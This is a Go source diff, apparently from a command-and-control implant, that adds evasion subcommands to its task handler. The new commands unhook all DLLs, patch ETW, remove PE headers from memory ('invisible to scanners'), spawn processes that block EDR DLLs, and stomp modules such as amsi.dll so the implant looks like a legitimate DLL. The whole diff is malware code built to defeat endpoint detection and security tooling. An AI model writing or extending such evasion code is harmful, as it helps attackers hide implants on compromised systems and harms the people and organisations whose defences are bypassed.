@@ -269,6 +269,42 @@ func (imp *Implant) executeTask(task protocol.Task) *protocol.TaskResult {
 				} else {
 					output = []byte("[-] Indirect syscalls: " + stubErr.Error())
 				}
+			case "advanced", "full", "edr":
+				results := InitAdvancedEvasion()
+				output = []byte(strings.Join(results, "\n"))
+			case "unhookall":
+				results := UnhookAllDLLs()
+				output = []byte(strings.Join(results, "\n"))
+			case "patchetw":
+				results := PatchAllETW()
+				output = []byte(strings.Join(results, "\n"))
+			case "removepe":
+				if err2 := RemovePEHeaders(); err2 == nil {
+					output = []byte("[+] PE headers removed from memory — invisible to scanners")
+				} else {
+					output = []byte("[-] PE header removal failed: " + err2.Error())
+				}
+			case "blockdlls":
+				if len(task.Args) > 1 {
+					pid, err2 := SpawnWithBlockDLLs(task.Args[1])
+					if err2 == nil {
+						output = []byte(fmt.Sprintf("[+] Process spawned with BlockDLLs policy (PID: %d)\n[+] EDR DLLs blocked from injection", pid))
+					} else {
+						output = []byte("[-] BlockDLLs failed: " + err2.Error())
+					}
+				} else {
+					output = []byte("Usage: evasion blockdlls <command>\nExample: evasion blockdlls notepad.exe")
+				}
+			case "stomp":
+				if len(task.Args) > 1 {
+					if err2 := ModuleStomp(task.Args[1]); err2 == nil {
+						output = []byte(fmt.Sprintf("[+] Module stomped: %s — implant code now appears as legitimate DLL", task.Args[1]))
+					} else {
+						output = []byte("[-] Module stomp failed: " + err2.Error())
+					}
+				} else {
+					output = []byte("Usage: evasion stomp <dll_name>\nExample: evasion stomp amsi.dll")
+				}
 			default:
 				results := InitEvasion()
 				output = []byte(strings.Join(results, "\n"))
